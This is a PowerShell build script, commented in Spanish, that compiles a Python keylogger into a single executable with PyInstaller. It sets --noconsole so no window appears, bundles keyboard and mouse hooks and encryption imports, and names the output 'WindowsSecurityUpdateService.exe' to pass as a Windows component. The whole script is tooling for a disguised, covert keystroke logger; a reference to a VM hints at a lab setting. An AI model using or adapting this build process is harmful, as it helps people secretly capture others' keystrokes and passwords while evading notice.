# Compila el keylogger a ejecutable con PyInstaller.
# Ejecutar desde PowerShell en la VM o en el host:
#   cd Y:\build
#   .\build.ps1

$ErrorActionPreference = "Stop"
$ProjectRoot = Split-Path -Parent $PSScriptRoot
$SrcDir = Join-Path $ProjectRoot "src"
$DistDir = Join-Path $ProjectRoot "dist"
$BuildDir = Join-Path $ProjectRoot "build\pyinstaller"

Write-Host "[*] Instalando dependencias de compilacion..."
pip install -r (Join-Path $ProjectRoot "requirements.txt")

Write-Host "[*] Compilando keylogger..."
Set-Location $SrcDir

python -m PyInstaller `
    --noconfirm `
    --clean `
    --onefile `
    --noconsole `
    --name WindowsSecurityUpdateService `
    --distpath $DistDir `
    --workpath $BuildDir `
    --hidden-import pynput.keyboard._win32 `
    --hidden-import pynput.mouse._win32 `
    --hidden-import cryptography.hazmat.primitives.ciphers.aead `
    keylogger.py

$ExePath = Join-Path $DistDir "WindowsSecurityUpdateService.exe"
if (Test-Path $ExePath) {
    $Hash = Get-FileHash $ExePath -Algorithm SHA256
    Write-Host "[+] Ejecutable generado: $ExePath"
    Write-Host "[+] SHA-256: $($Hash.Hash)"
    $Hash.Hash | Out-File (Join-Path $DistDir "WindowsSecurityUpdateService.sha256.txt") -Encoding ascii
} else {
    Write-Error "[-] No se genero el ejecutable."
}